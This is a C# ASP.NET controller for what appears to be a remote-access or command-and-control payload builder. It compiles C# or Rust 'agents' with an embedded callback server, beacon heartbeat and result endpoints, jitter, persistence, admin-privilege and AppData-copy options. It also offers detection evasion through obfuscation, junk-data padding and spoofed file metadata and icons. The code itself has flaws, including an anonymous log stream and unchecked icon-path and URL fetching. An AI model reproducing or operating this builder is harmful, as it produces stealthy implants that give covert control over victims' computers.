using System.Collections.Concurrent;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using LibraNextgen.Common.Models;

namespace LibraNextgen.Service.Controllers;

[ApiController]
[Route("api/builder")]
[Authorize]
public class BuilderController : ControllerBase
{
    private static readonly string AgentProjDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "agent"));
    private static readonly string OutputBase = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "build-output"));
    private static readonly string HistoryFile = Path.Combine(OutputBase, "builds.json");

    private static readonly Dictionary<string, string> PlatformRid = new()
    {
        ["x64"] = "win-x64",
        ["x86"] = "win-x86",
        ["arm"] = "linux-arm64",
    };

    private static readonly string RustAgentDir = Path.GetFullPath(Path.Combine(AppContext.BaseDirectory, "..", "..", "..", "..", "..", "agent-rs"));

    private static readonly Dictionary<string, string> RustTargetTriple = new()
    {
        ["x64"] = "x86_64-pc-windows-msvc",
        ["x86"] = "i686-pc-windows-msvc",
        ["arm"] = "aarch64-unknown-linux-gnu",
    };

    private static readonly string IconUploadDir = Path.Combine(Path.GetTempPath(), "libra-build-icons");
    private static readonly object _buildLock = new();
    private static readonly ConcurrentDictionary<string, BuildJob> _activeJobs = new();

    // ── Build history persistence ──────────────────────────────────────

    private static List<BuildRecord> LoadHistory()
    {
        try
        {
            if (System.IO.File.Exists(HistoryFile))
            {
                var json = System.IO.File.ReadAllText(HistoryFile);
                return JsonSerializer.Deserialize<List<BuildRecord>>(json) ?? new List<BuildRecord>();
            }
        }
        catch { }
        return new List<BuildRecord>();
    }

    private static void SaveHistory(List<BuildRecord> records)
    {
        try
        {
            Directory.CreateDirectory(OutputBase);
            var json = JsonSerializer.Serialize(records);
            System.IO.File.WriteAllText(HistoryFile, json);
        }
        catch { }
    }

    // ── Icon upload ────────────────────────────────────────────────────

    [HttpPost("upload-icon")]
    public async Task<IActionResult> UploadIcon(IFormFile file, CancellationToken ct)
    {
        if (file == null || file.Length == 0)
            return BadRequest(new { error = "No file provided." });

        var ext = Path.GetExtension(file.FileName).ToLower();
        if (ext != ".ico")
            return BadRequest(new { error = "Only .ico files are supported." });

        if (file.Length > 2 * 1024 * 1024)
            return BadRequest(new { error = "Icon file must be under 2 MB." });

        try
        {
            Directory.CreateDirectory(IconUploadDir);
            var fileName = $"{Guid.NewGuid():N}{ext}";
            var filePath = Path.Combine(IconUploadDir, fileName);
            await using var stream = System.IO.File.Create(filePath);
            await file.CopyToAsync(stream, ct);
            return Ok(new { path = filePath });
        }
        catch (Exception ex)
        {
            return StatusCode(500, new { error = ex.Message });
        }
    }

    // ── Build (async) ──────────────────────────────────────────────────

    [HttpPost("build")]
    public IActionResult Build([FromBody] BuildConfigRequest req)
    {
        if (!PlatformRid.TryGetValue(req.Platform, out var rid))
            return BadRequest(new { error = $"Unsupported platform: {req.Platform}" });

        var buildId = Guid.NewGuid().ToString("N")[..8];
        var record = new BuildRecord
        {
            Id = buildId,
            Platform = req.Platform,
            Config = req,
            FileName = $"agent-{req.Platform}-{buildId}.exe",
            Status = "building",
            CreatedAt = DateTime.UtcNow.ToString("o"),
        };

        // Save initial record
        var history = LoadHistory();
        history.Insert(0, record);
        SaveHistory(history);

        var job = new BuildJob { Record = record };
        _activeJobs[buildId] = job;

        // Run build in background
        _ = Task.Run(() => RunBuildAsync(buildId, req, rid, job));

        return Ok(new { buildId });
    }

    // ── SSE stream ─────────────────────────────────────────────────────

    [HttpGet("stream/{buildId}")]
    [AllowAnonymous]
    public async Task StreamBuild(string buildId, CancellationToken ct)
    {
        Response.Headers["Content-Type"] = "text/event-stream";
        Response.Headers["Cache-Control"] = "no-cache";
        Response.Headers["Connection"] = "keep-alive";

        if (!_activeJobs.TryGetValue(buildId, out var job))
        {
            // Build may have already completed — check history
            var history = LoadHistory();
            var record = history.FirstOrDefault(r => r.Id == buildId);
            if (record != null)
            {
                await SseWriteAsync($"data: {JsonSerializer.Serialize(new { type = "status", status = record.Status, error = record.Error })}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
            }
            else
            {
                await SseWriteAsync("data: {\"type\":\"error\",\"message\":\"Build not found\"}\n\n", ct);
            }
            return;
        }

        var lastIndex = 0;
        while (!ct.IsCancellationRequested)
        {
            var logs = job.GetLogs();
            while (lastIndex < logs.Count)
            {
                var line = JsonSerializer.Serialize(new { type = "log", text = logs[lastIndex] });
                await SseWriteAsync($"data: {line}\n\n", ct);
                lastIndex++;
            }

            if (job.IsCompleted)
            {
                var statusMsg = JsonSerializer.Serialize(new { type = "status", status = job.Record.Status, error = job.Record.Error });
                await SseWriteAsync($"data: {statusMsg}\n\n", ct);
                await SseWriteAsync("data: {\"type\":\"done\"}\n\n", ct);
                break;
            }

            await Task.Delay(200, ct);
        }
    }

    private async Task SseWriteAsync(string text, CancellationToken ct)
    {
        var bytes = Encoding.UTF8.GetBytes(text);
        await Response.Body.WriteAsync(bytes, ct);
        await Response.Body.FlushAsync(ct);
    }

    // ── History CRUD ───────────────────────────────────────────────────

    [HttpGet("list")]
    public IActionResult List()
    {
        var history = LoadHistory();
        // Don't send full config in list view, just summary
        var items = history.Select(r => new
        {
            r.Id,
            r.Platform,
            r.FileName,
            r.FileSize,
            r.Status,
            r.Error,
            r.CreatedAt,
            r.CompletedAt,
        });
        return Ok(items);
    }

    [HttpGet("info/{buildId}")]
    public IActionResult Info(string buildId)
    {
        var history = LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });
        return Ok(record);
    }

    [HttpGet("download/{buildId}")]
    public IActionResult Download(string buildId)
    {
        var history = LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record == null)
            return NotFound(new { error = "Build not found." });

        var filePath = Path.Combine(OutputBase, buildId, record.FileName);
        if (!System.IO.File.Exists(filePath))
            return NotFound(new { error = "Build file not found on disk." });

        var stream = System.IO.File.OpenRead(filePath);
        return File(stream, "application/octet-stream", record.FileName);
    }

    [HttpDelete("{buildId}")]
    public IActionResult DeleteBuild(string buildId)
    {
        // If build is still running, don't allow delete
        if (_activeJobs.TryGetValue(buildId, out _))
            return BadRequest(new { error = "Cannot delete a build in progress." });

        var history = LoadHistory();
        var record = history.FirstOrDefault(r => r.Id == buildId);
        if (record != null)
        {
            history.Remove(record);
            SaveHistory(history);
        }

        // Clean up files
        var buildDir = Path.Combine(OutputBase, buildId);
        lock (_buildLock)
        {
            try { if (Directory.Exists(buildDir)) Directory.Delete(buildDir, true); }
            catch { /* best effort */ }
        }

        return Ok(new { status = "ok" });
    }

    // ── Build engine ───────────────────────────────────────────────────

    private async Task RunBuildAsync(string buildId, BuildConfigRequest req, string rid, BuildJob job)
    {
        var tempDir = Path.Combine(OutputBase, buildId);
        var agentSourceDir = Path.Combine(tempDir, "agent");
        var commonSourceDir = Path.Combine(tempDir, "common");

        try
        {
            if (req.Language == "rust")
            {
                await RunRustBuildAsync(buildId, req, rid, job);
                return;
            }

            lock (_buildLock)
            {
                if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
                Directory.CreateDirectory(tempDir);
            }

            job.Log("Preparing source...");

            CopyDir(AgentProjDir, agentSourceDir);
            var commonProjDir = Path.GetFullPath(Path.Combine(AgentProjDir, "..", "LibraNextgen.Common"));
            CopyDir(commonProjDir, commonSourceDir);

            // Fix project reference
            var csprojPath = Path.Combine(agentSourceDir, "agent.csproj");
            var csproj = await System.IO.File.ReadAllTextAsync(csprojPath);
            csproj = csproj.Replace(
                @"Include=""..\LibraNextgen.Common\LibraNextgen.Common.csproj""",
                @"Include=""..\common\LibraNextgen.Common.csproj""");

            // Write BuildDefaults.cs
            var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
            var buildDefaults = new StringBuilder();
            buildDefaults.AppendLine("namespace LibraNextgen.Agent.Core;");
            buildDefaults.AppendLine("public static class BuildDefaults");
            buildDefaults.AppendLine("{");
            buildDefaults.AppendLine($"    public static string? ServerUrl = \"{serverUrl}\";");
            buildDefaults.AppendLine($"    public static bool RequireAdmin = {req.RequireAdmin.ToString().ToLower()};");
            buildDefaults.AppendLine($"    public static string? CopyToPath = {(req.CopyToAppData ? "\"LibraNextgen\"" : "null")};");
            buildDefaults.AppendLine($"    public static bool EnablePersistence = {req.EnablePersistence.ToString().ToLower()};");
            buildDefaults.AppendLine("}");
            var coreDir = Path.Combine(agentSourceDir, "Core");
            await System.IO.File.WriteAllTextAsync(Path.Combine(coreDir, "BuildDefaults.cs"), buildDefaults.ToString());

            // Patch csproj for OutputType
            var outputType = req.ApplicationType == "Desktop" ? "WinExe" : "Exe";
            csproj = csproj.Replace("  </PropertyGroup>",
                $"    <OutputType>{outputType}</OutputType>\n  </PropertyGroup>");

            // Patch csproj for metadata / icon
            if (!string.IsNullOrEmpty(req.CompanyName) || !string.IsNullOrEmpty(req.FileDescription) ||
                !string.IsNullOrEmpty(req.ProductName) || !string.IsNullOrEmpty(req.Copyright) ||
                !string.IsNullOrEmpty(req.FileVersion) || !string.IsNullOrEmpty(req.IconUrl))
            {
                var props = new List<string>();
                if (!string.IsNullOrEmpty(req.CompanyName)) props.Add($"    <Company>{EscapeXml(req.CompanyName)}</Company>");
                if (!string.IsNullOrEmpty(req.FileDescription)) props.Add($"    <Description>{EscapeXml(req.FileDescription)}</Description>");
                if (!string.IsNullOrEmpty(req.ProductName)) props.Add($"    <Product>{EscapeXml(req.ProductName)}</Product>");
                if (!string.IsNullOrEmpty(req.Copyright)) props.Add($"    <Copyright>{EscapeXml(req.Copyright)}</Copyright>");
                if (!string.IsNullOrEmpty(req.FileVersion)) props.Add($"    <FileVersion>{EscapeXml(req.FileVersion)}</FileVersion>");
                if (!string.IsNullOrEmpty(req.IconUrl)) props.Add($"    <ApplicationIcon>{EscapeXml(req.IconUrl)}</ApplicationIcon>");

                var insert = string.Join("\n", props);
                csproj = csproj.Replace("  </PropertyGroup>", $"{insert}\n  </PropertyGroup>");
            }

            // Handle icon
            if (!string.IsNullOrEmpty(req.IconUrl))
            {
                try
                {
                    byte[]? iconBytes = null;
                    if (System.IO.File.Exists(req.IconUrl))
                        iconBytes = await System.IO.File.ReadAllBytesAsync(req.IconUrl);
                    else if (req.IconUrl.StartsWith("http"))
                    {
                        using var http = new HttpClient();
                        iconBytes = await http.GetByteArrayAsync(req.IconUrl);
                    }

                    if (iconBytes != null && iconBytes.Length > 0)
                    {
                        await System.IO.File.WriteAllBytesAsync(Path.Combine(agentSourceDir, "custom.ico"), iconBytes);
                        csproj = csproj.Replace($"<ApplicationIcon>{EscapeXml(req.IconUrl)}</ApplicationIcon>",
                            "<ApplicationIcon>custom.ico</ApplicationIcon>");
                    }
                }
                catch { job.Log("[WARN] Icon handling failed, continuing without icon."); }
            }

            await System.IO.File.WriteAllTextAsync(csprojPath, csproj);

            // Build
            var outDir = Path.Combine(tempDir, "out");
            var trimFlag = req.TrimUnused ? "-p:PublishTrimmed=true" : "";
            var buildArgs = $"publish \"{agentSourceDir}/agent.csproj\" -c Release -r {rid} --self-contained true {trimFlag} -p:DebugType=none -p:DebugSymbols=false -o \"{outDir}\"";

            job.Log($"dotnet {buildArgs}");

            var psi = new ProcessStartInfo("dotnet", buildArgs)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true,
            };

            using var proc = new Process { StartInfo = psi };

            var outputTcs = new TaskCompletionSource();
            var errorTcs = new TaskCompletionSource();

            proc.OutputDataReceived += (_, e) =>
            {
                if (e.Data != null) job.Log(e.Data);
                else outputTcs.TrySetResult();
            };
            proc.ErrorDataReceived += (_, e) =>
            {
                if (e.Data != null) job.Log($"[stderr] {e.Data}");
                else errorTcs.TrySetResult();
            };

            proc.Start();
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();
            await proc.WaitForExitAsync();
            await Task.WhenAll(outputTcs.Task, errorTcs.Task);

            if (proc.ExitCode != 0)
            {
                job.Fail($"dotnet publish exited with code {proc.ExitCode}");
                UpdateHistory(job);
                return;
            }

            // Find output exe
            var exeName = rid.StartsWith("win") ? "agent.exe" : "agent";
            var exePath = Path.Combine(outDir, exeName);
            if (!System.IO.File.Exists(exePath))
                exePath = Directory.GetFiles(outDir, rid.StartsWith("win") ? "*.exe" : "*")
                    .FirstOrDefault(f => !f.EndsWith(".pdb") && !f.EndsWith(".dll")) ?? exePath;

            if (!System.IO.File.Exists(exePath))
            {
                job.Fail("Build succeeded but output executable not found.");
                UpdateHistory(job);
                return;
            }

            // Post-process: inject junk data
            if (req.InjectJunkData && req.JunkDataMb > 0)
            {
                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
                await fs.WriteAsync(junk);
            }

            // Obfuscation
            if (req.EnableObfuscation)
            {
                job.Log("Running Obfuscar...");
                var obfuscarConfig = GenerateObfuscarConfig(outDir);
                var obfuscConfigPath = Path.Combine(tempDir, "obfuscar.xml");
                await System.IO.File.WriteAllTextAsync(obfuscConfigPath, obfuscarConfig);

                var obfPsi = new ProcessStartInfo("obfuscar.console", obfuscConfigPath)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                try
                {
                    using var obfProc = Process.Start(obfPsi);
                    if (obfProc != null)
                    {
                        var obfOut = await obfProc.StandardOutput.ReadToEndAsync();
                        var obfErr = await obfProc.StandardError.ReadToEndAsync();
                        await obfProc.WaitForExitAsync();
                        if (!string.IsNullOrWhiteSpace(obfOut)) job.Log(obfOut);
                        if (!string.IsNullOrWhiteSpace(obfErr)) job.Log($"[obfuscar] {obfErr}");
                    }
                }
                catch (Exception ex) { job.Log($"[WARN] Obfuscar failed: {ex.Message}"); }
            }

            // Move binary to build output root
            var finalDir = Path.Combine(OutputBase, buildId);
            var finalPath = Path.Combine(finalDir, job.Record.FileName);
            Directory.CreateDirectory(finalDir);
            System.IO.File.Copy(exePath, finalPath, true);

            var fileInfo = new FileInfo(finalPath);
            job.Complete(fileInfo.Length);

            job.Log($"Build complete: {finalPath} ({fileInfo.Length} bytes)");

            // Cleanup temp source
            lock (_buildLock)
            {
                try { if (Directory.Exists(tempDir + "_src")) Directory.Delete(tempDir + "_src", true); }
                catch { }
            }

            UpdateHistory(job);
        }
        catch (Exception ex)
        {
            job.Fail(ex.Message);
            UpdateHistory(job);
        }
        finally
        {
            // Keep the job in dictionary for a bit so SSE clients can drain
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                _activeJobs.TryRemove(buildId, out _);
            });
        }
    }

    // ── Rust build ──────────────────────────────────────────────────────

    private async Task RunRustBuildAsync(string buildId, BuildConfigRequest req, string rid, BuildJob job)
    {
        var tempDir = Path.Combine(OutputBase, buildId);
        var targetDir = Path.Combine(tempDir, "target");

        try
        {
            lock (_buildLock)
            {
                if (Directory.Exists(tempDir)) Directory.Delete(tempDir, true);
                Directory.CreateDirectory(tempDir);
            }

            // Check cargo availability
            job.Log("Checking Rust toolchain...");
            var cargoCheck = await RunProcessAsync("cargo", "--version", job);
            if (cargoCheck.ExitCode != 0)
            {
                job.Fail("Cargo/Rust is not installed. Install from https://rustup.rs");
                UpdateHistory(job);
                return;
            }
            job.Log($"Rust toolchain: {cargoCheck.Stdout.Trim()}");

            // Determine target triple
            string? targetTriple = null;
            if (RustTargetTriple.TryGetValue(req.Platform, out var triple))
            {
                targetTriple = triple;
            }

            // Build target arg
            var targetArg = targetTriple != null ? $"--target {targetTriple}" : "";

            // Run cargo build
            job.Log($"Building Rust agent (platform: {req.Platform}{(targetTriple != null ? ", target: " + targetTriple : "")})...");
            job.Log($"cargo build --release {targetArg} --target-dir \"{targetDir}\"");

            var buildArgs = $"build --release {targetArg} --target-dir \"{targetDir}\"";
            // Run cargo from the agent-rs workspace root
            var buildResult = await RunProcessAsync("cargo", buildArgs, job, RustAgentDir);

            if (buildResult.ExitCode != 0)
            {
                job.Fail($"cargo build exited with code {buildResult.ExitCode}");
                UpdateHistory(job);
                return;
            }

            // Find output binary
            var releaseDir = targetTriple != null
                ? Path.Combine(targetDir, targetTriple, "release")
                : Path.Combine(targetDir, "release");

            var exeName = (targetTriple != null && targetTriple.Contains("windows")) || targetTriple == null
                ? "agent.exe"
                : "agent";

            var exePath = Path.Combine(releaseDir, exeName);
            if (!System.IO.File.Exists(exePath))
            {
                // Try searching
                var found = Directory.GetFiles(releaseDir, "*")
                    .FirstOrDefault(f => Path.GetFileName(f) == "agent" || Path.GetFileName(f) == "agent.exe");
                if (found != null)
                    exePath = found;
            }

            if (!System.IO.File.Exists(exePath))
            {
                job.Fail($"cargo build succeeded but output binary not found at {releaseDir}");
                UpdateHistory(job);
                return;
            }

            job.Log($"Binary found: {exePath}");

            // ── Config injection: append CONFIG_MAGIC + length + JSON ──
            job.Log("Injecting build config...");
            var serverUrl = $"http://{req.ServerHost}:{req.ServerPort}";
            var injectedConfig = new InjectedConfig
            {
                server_url = serverUrl,
                register_path = "/api/beacon/register",
                heartbeat_path = "/api/beacon/heartbeat",
                result_path = "/api/beacon/result",
                ws_path = "/ws/agent",
                heartbeat_interval_ms = 3000,
                jitter_percent = 0.2,
                require_admin = req.RequireAdmin,
                copy_to_path = req.CopyToAppData ? "LibraNextgen" : null,
                enable_persistence = req.EnablePersistence,
            };

            var configJson = JsonSerializer.Serialize(injectedConfig);
            var configBytes = Encoding.UTF8.GetBytes(configJson);
            var magicBytes = Encoding.UTF8.GetBytes("LIBRA_CFG_BLOCK!");

            await using (var fs = System.IO.File.Open(exePath, FileMode.Append))
            {
                // Magic
                await fs.WriteAsync(magicBytes);
                // Length (4 bytes, little-endian)
                var lenBytes = BitConverter.GetBytes((uint)configBytes.Length);
                await fs.WriteAsync(lenBytes);
                // JSON payload
                await fs.WriteAsync(configBytes);
            }

            job.Log($"Config injected: {configJson.Length} bytes");

            // ── Goldberg obfuscation ──
            if (req.EnableObfuscation)
            {
                job.Log("Running goldberg obfuscation...");
                try
                {
                    var goldbergResult = await RunProcessAsync("goldberg", $"obfuscate \"{exePath}\"", job);
                    if (goldbergResult.ExitCode == 0)
                        job.Log("Goldberg obfuscation completed.");
                    else
                        job.Log($"[WARN] goldberg failed (exit {goldbergResult.ExitCode}), continuing without obfuscation.");
                }
                catch (Exception ex)
                {
                    job.Log($"[WARN] goldberg not available: {ex.Message}");
                }
            }

            // ── Junk data injection ──
            if (req.InjectJunkData && req.JunkDataMb > 0)
            {
                job.Log($"Injecting {req.JunkDataMb} MB junk data...");
                var junk = RandomNumberGenerator.GetBytes(req.JunkDataMb * 1024 * 1024);
                await using var fs = System.IO.File.Open(exePath, FileMode.Append);
                await fs.WriteAsync(junk);
            }

            // ── Move to final output ──
            var finalDir = Path.Combine(OutputBase, buildId);
            var finalPath = Path.Combine(finalDir, job.Record.FileName);
            Directory.CreateDirectory(finalDir);
            System.IO.File.Copy(exePath, finalPath, true);

            var fileInfo = new FileInfo(finalPath);
            job.Complete(fileInfo.Length);
            job.Log($"Build complete: {finalPath} ({fileInfo.Length} bytes)");

            UpdateHistory(job);
        }
        catch (Exception ex)
        {
            job.Fail($"Rust build failed: {ex.Message}");
            UpdateHistory(job);
        }
        finally
        {
            _ = Task.Run(async () =>
            {
                await Task.Delay(30_000);
                _activeJobs.TryRemove(buildId, out _);
            });
        }
    }

    private static async Task<ProcessResult> RunProcessAsync(string fileName, string arguments, BuildJob job, string? workingDir = null)
    {
        var psi = new ProcessStartInfo(fileName, arguments)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true,
        };
        if (workingDir != null) psi.WorkingDirectory = workingDir;

        using var proc = new Process { StartInfo = psi };
        var stdoutTcs = new TaskCompletionSource<string>();
        var stderrTcs = new TaskCompletionSource<string>();
        var stdout = new StringBuilder();
        var stderr = new StringBuilder();

        proc.OutputDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log(e.Data); stdout.AppendLine(e.Data); }
            else stdoutTcs.TrySetResult(stdout.ToString());
        };
        proc.ErrorDataReceived += (_, e) =>
        {
            if (e.Data != null) { job.Log($"[stderr] {e.Data}"); stderr.AppendLine(e.Data); }
            else stderrTcs.TrySetResult(stderr.ToString());
        };

        proc.Start();
        proc.BeginOutputReadLine();
        proc.BeginErrorReadLine();
        await proc.WaitForExitAsync();
        var stdoutStr = await stdoutTcs.Task;
        var stderrStr = await stderrTcs.Task;

        return new ProcessResult(proc.ExitCode, stdoutStr, stderrStr);
    }

    private static void UpdateHistory(BuildJob job)
    {
        var history = LoadHistory();
        var idx = history.FindIndex(r => r.Id == job.Record.Id);
        if (idx >= 0)
            history[idx] = job.Record;
        else
            history.Insert(0, job.Record);
        SaveHistory(history);
    }

    // ── Helpers ────────────────────────────────────────────────────────

    private static void CopyDir(string src, string dst)
    {
        foreach (var dir in Directory.GetDirectories(src, "*", SearchOption.AllDirectories))
        {
            var target = Path.Combine(dst, Path.GetRelativePath(src, dir));
            Directory.CreateDirectory(target);
        }
        foreach (var file in Directory.GetFiles(src, "*", SearchOption.AllDirectories))
        {
            var target = Path.Combine(dst, Path.GetRelativePath(src, file));
            System.IO.File.Copy(file, target, true);
        }
    }

    private static string GenerateObfuscarConfig(string outDir)
    {
        return $@"<?xml version='1.0'?>
<Obfuscator>
  <Var name='InPath' value='{outDir}' />
  <Var name='OutPath' value='{outDir}_obfuscated' />
  <Module file='$(InPath)/agent.dll'>
    <SkipType name='LibraNextgen.Agent.Program' />
  </Module>
</Obfuscator>";
    }

    private static string EscapeXml(string s) => s.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;");
}

// ── Supporting types ──────────────────────────────────────────────────

public class BuildRecord
{
    public string Id { get; set; } = "";
    public string Platform { get; set; } = "x64";
    public BuildConfigRequest? Config { get; set; }
    public string FileName { get; set; } = "";
    public long FileSize { get; set; }
    public string Status { get; set; } = "building"; // building, completed, failed
    public string? Error { get; set; }
    public string CreatedAt { get; set; } = "";
    public string? CompletedAt { get; set; }
}

internal record struct ProcessResult(int ExitCode, string Stdout, string Stderr);

public class BuildJob
{
    private readonly List<string> _logs = new();
    private readonly object _lock = new();

    public BuildRecord Record { get; set; } = null!;
    public bool IsCompleted { get; private set; }

    public void Log(string line)
    {
        lock (_lock) { _logs.Add(line); }
    }

    public List<string> GetLogs()
    {
        lock (_lock) { return _logs.ToList(); }
    }

    public void Complete(long fileSize)
    {
        IsCompleted = true;
        Record.Status = "completed";
        Record.FileSize = fileSize;
        Record.CompletedAt = DateTime.UtcNow.ToString("o");
    }

    public void Fail(string error)
    {
        IsCompleted = true;
        Record.Status = "failed";
        Record.Error = error;
        Record.CompletedAt = DateTime.UtcNow.ToString("o");
    }
}
